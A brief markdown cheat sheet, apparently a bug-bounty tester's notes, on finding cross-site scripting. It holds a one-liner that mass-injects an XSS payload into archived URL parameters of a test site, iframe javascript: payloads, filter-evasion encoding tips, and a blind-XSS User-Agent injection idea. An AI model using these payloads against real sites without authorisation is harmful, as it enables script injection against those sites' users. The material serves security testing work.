## One Liner
```bash
echo http://testphp.vulnweb.com | waybackurls  | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
``````


DOM XSS
``<iframe src="javascript:alert(\`xss\`)">``
``<iframe src="javascript:alert(`xss`)">``

Burp Extensions:
1. Flow
2. DOM Invader

Tools:
1. XSStrike

Resource:
1. `https://github.com/s0md3v/AwesomeXSS`

Payloads:
1. https://target.com/<>javascript:alert(1);

## Encoding techniques
1. Use https://onlineasciitools.com/convert-ascii-to-html-entities to encode part of payload into HTML encoding. Try both type, i.e, decimal and hex html encodings.

### Find XSS
Use burp match and replace to add BXSS payload to UA string.

